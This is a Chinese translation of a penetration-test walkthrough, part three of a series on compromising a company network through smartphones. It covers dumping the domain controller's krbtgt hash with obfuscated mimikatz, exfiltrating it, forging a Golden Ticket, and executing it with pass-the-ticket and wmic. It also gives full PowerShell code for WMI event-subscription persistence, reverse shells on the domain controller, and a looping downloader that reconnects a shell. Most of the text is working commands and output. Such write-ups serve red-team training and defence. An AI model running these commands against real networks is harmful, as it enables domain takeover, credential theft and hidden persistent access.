# 【技术分享】公司智能手机安全（三）—— 瞄准域控制器与寻找Golden Ticket

#### 译文声明
本文为翻译文章，原文来源：infosecinstitute.com。具体内容及含义以原文为准。
- **翻译**：[村雨其实没有雨](http://bobao.360.cn/member/contribute?uid=2671379114)
- **预估稿费**：110 RMB
- **投稿方式**：发送邮件至 linwei#360.cn 或通过网页版在线投稿
- **系列前两章**：请参见 [这里](http://bobao.360.cn/learning/detail/3762.html) 和 [这里](http://bobao.360.cn/learning/detail/3763.html)

在离开内部网络之前，我们决定获取域控制器的哈希值，特别是Kerberos账户(krbtgt)，以便创建一个Golden Ticket。

**译者注**：Golden Ticket是指伪造的TGT (Ticket Granting Ticket)，而Silver Ticket是伪造的TGS (Ticket Granting Server)。

Golden Ticket攻击能够让我们创建离线的Kerberos TGT来进行未授权访问，并且可以伪造任何域用户。此外，它的有效期长达十年，即使域管理员的凭证发生了变化，它仍然有效。这是一个极佳的权限维持案例。

为了实现这一目标，我们需要以下信息：
- krbtgt哈希值
- 域SID
- 用户名（此处为Administrator）
- 域名称（此处为SUPERCOMPANY）

通过类似的方法（如SRVWSUS上的端口转发和改良过的SMBExec），我们在域控制器上获得了具有本地管理员权限的Powershell会话。接下来，我们执行了混淆过的mimikatz来获取活动目录数据，并将其保存在`hash.txt`文件中：

```powershell
invoke-mymy -command 'privilege::debug "LSADump::LSA /inject"' > hash.txt
```

mimikatz脚本在文件末尾没有自动调用命令。我们将哈希文件外泄到我们的Web服务器上，内容如下：

```
RID : 000001f6 (502)
User : krbtgt
* Primary
LM :
NTLM : 3003567af268a4aXXXXXXXXXXXXXXXXX
```

使用`get-addomain` cmdlet（在域控制器上自动导入），我们获取了域SID：

```powershell
PS C:test> get-addomain
AllowedDNSSuffixes : {}
ChildDomains : {}
ComputersContainer : CN=Computers,DC=supercompany,DC=local
DeletedObjectsContainer : CN=Deleted Objects,DC=supercompany,DC=local
DistinguishedName : DC=supercompany,DC=local
DNSRoot : supercompany.local
DomainControllersContainer : OU=Domain Controllers,DC=supercompany,DC=local
DomainMode : Windows2012R2Domain
DomainSID : S-1-5-21-3534665177-2148510708-2241433719
...
```

注意：我们可以从mimikatz获得的管理员（其UID = 500）获取域SID：

```
S-1-5-21-3534665177-2148510708-2241433719-500
```

现在是时候创建我们的Golden Ticket了：

```powershell
invoke-mymy -command 'privilege::debug "Kerberos::golden /admin:Administrator /domain:supercompany.LOCAL /sid:S-1-5-21-3534665177-2148510708-2241433719 /krbtgt:3003567af268a4a94e26f410e84353f1 /ticket:admin.krb"'
```

输出结果：

```
.#####. mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. “A La Vie, A L’Amour”
## /  ## /* * *
##  / ## Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
‘## v ##’ http://blog.gentilkiwi.com/mimikatz     (oe.eo)
‘#####’     with 20 modules * * */
mimikatz(powershell) # privilege::debug
Privilege ’20’ OK
mimikatz(powershell) # Kerberos::golden /admin:Administrator /domain:supercompany.LOCAL /sid:S-1-5-21-3534665177-2148510708-2241433719 /krbtgt:3003567af268a4a94e26f410e84353f1 /ticket:admin.krb
User     : Administrator
Domain    : supercompany.LOCAL (SUPERCOMPANY)
SID     : S-1-5-21-3534665177-2148510708-2241433719
User Id : 500
Groups Id : *513 512 520 518 519
ServiceKey: 3003567af268a4a94e26f410e84353f1 – rc4_hmac_nt
Lifetime : 2/17/2017 4:02:10 PM ; 2/17/2027 4:02:10 PM ; 3/3/2027 4:02:10 PM
-> Ticket : admin.krb
* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated
```

最后将Ticket存到文件中，之后我们会用到`admin.krb`文件。

### 权限维持

在离开系统之前，我们必须设置一种方法来维持对暴露在公网的服务器的访问，以供日后使用。在这一步，不被发现并不容易，即使是新手系统管理员也会发现一些端倪。

我们选择了一种基于WMI特性的更复杂的方法，利用了`InstanceModificationEvent`。当WMI对象实例改变其寄存器时，它会作为一个`InstanceModificationEvent`触发。在这种情况下，我们过滤了事件系统启动时间，在系统启动后的200到300秒内，我们将为eventconsumer提供一个`CommandLineEventConsumer`。

在SRVWSUS这台服务器上，我们发送了以下命令：

```powershell
$filterName = "JustForTestFilter"
$consumerName = "JustForTestConsumer"
$exePath = "C:windowshelpwindowsindexstorer.bat"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime <= 300"

$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = $filterName
$filter.QueryLanguage = "WQL"
$filter.Query = $Query
$filter.EventNamespace = 'rootcimv2'
$result = $filter.Put()

$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = $consumerName
$consumer.CommandLineTemplate = $exePath
$result = $consumer.Put()

$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.Get()
$binding.Consumer = $consumer.Get()
$result = $binding.Put()
```

这将确保在系统重新启动后，通过SRVWSUS执行本地SYSTEM权限的远程shell。

### 测试Golden Ticket

最后，我们测试了我们拿到的Golden Ticket，还记得`admin.krb`这个文件吗？

通过SRVWSUS本地系统管理员权限的shell，我们下载了`admin.krb`，配置了端口转发，并将带有回连指令的脚本`r3.ps1`上传到SRVWSUS的9000端口。

现在我们在会话中加载Ticket：

```powershell
PS C:tmp> Invoke-mymy -command '"kerberos::ptt admin.krb"'
.#####. mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
.## ^ ##. “A La Vie, A L’Amour”
## /  ## /* * *
##  / ## Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
‘## v ##’ http://blog.gentilkiwi.com/mimikatz (oe.eo)
‘#####’ with 20 modules * * */
mimikatz(powershell) # kerberos::ptt admin.krb
* File: ‘admin.krb’: OK
```

使用`klist`命令可以列出已加载的Kerberos令牌：

```powershell
PS C:tmp> klist
Current LogonId is 0:0x3e7
Cached Tickets: (1)
#0> Client: Administrator @ supercompany.LOCAL
Server: krbtgt/supercompany.LOCAL @ supercompany.LOCAL
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
Start Time: 2/17/2017 1:02:10 (local)
End Time: 2/17/2027 1:02:10 (local)
Renew Time: 2/18/2027 1:02:10 (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0x1 -> PRIMARY
Kdc Called:
```

成功了，Ticket成功加载！

对于下一个操作，我们使用Windows `wmic.exe`实用程序，它是一个WMI的命令行接口程序，允许通过Kerberos凭证访问远程系统。

我们在域控制器上复制了`r3.ps1`，没有任何问题，只需将管理员的Ticket加载到我们的会话中：

```powershell
PS C:tmp> copy c:tmpr3.ps1 \SRVDC1C$windowstempr3.ps1
```

然后运行：

```powershell
PS C:tmp> wmic /authority:"kerberos:SUPERCOMPANYSRVDC1" /node:SRVDC1 process call create "powershell -executionpolicy bypass -windowstyle hidden -f c:windowstempr3.ps1"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
ProcessId = 4528;
ReturnValue = 0;
};
```

稍等片刻后，我们在电脑上看到了来自SRVDC1的shell：

```powershell
PS C:Windowssystem32> whoami
supercompanyadministrator
```

即使Administrator的密码改变了，这种手段仍然有效。

关于Golden Ticket的潜在危险，我有几句话要说：
- 发现伪造的Kerberos Tickets非常困难。
- 在有证据的情况下，唯一的方法就是重置krbtg密码两次，但这可能会对Active Directory Infrastructure造成严重影响。

### 最后的步骤

还记得我们是如何在SRVWSUS获得第一个Powershell远程shell的吗？我们从企业内部网络的服务器执行了一个远程命令，通过安卓手机的Meterpreter转发这个连接。如果失去了Powershell的远程shell并且再也没有连接到受害者怎么办？游戏结束...

我们需要添加对SRVWSUS shell的持久访问权！怎么做呢？答案是通过从Tomcat的webshell添加访问SRVWSUS的功能：

```powershell
# 第一个smbexec命令：
IEX (New-Object Net.WebClient).DownloadFile('http:///r1.ps1', 'c:tmpr1.ps1')
# 第二个smbexec命令：
IEX (New-Object Net.WebClient).DownloadFile('http:///r1.bat', 'c:tmpr1.bat')
# 第三个smbexec命令：
'cmd /c c:tmpr1.bat'

# r1.bat包含的内容：
@echo off
:loop
powershell -executionpolicy bypass -windowstyle hidden -f c:tmpr.ps1
timeout /t 10
goto loop
```

虽然不优雅，但有效。一旦丢失了连接，等待十秒钟就会重新回连。

当然，我们可以加密和混淆所有的`.ps1`脚本，但我们只是想展示其原理。

### 结论

这就是我们的工作，并没有发明什么新的东西，但通过使用Windows内置的功能和一些脚本，我们完成了一件大事。有时候我们并不需要什么魔法一样的工具，只需要遵循K.I.S.S.原则。

总之，聪明地去办事吧！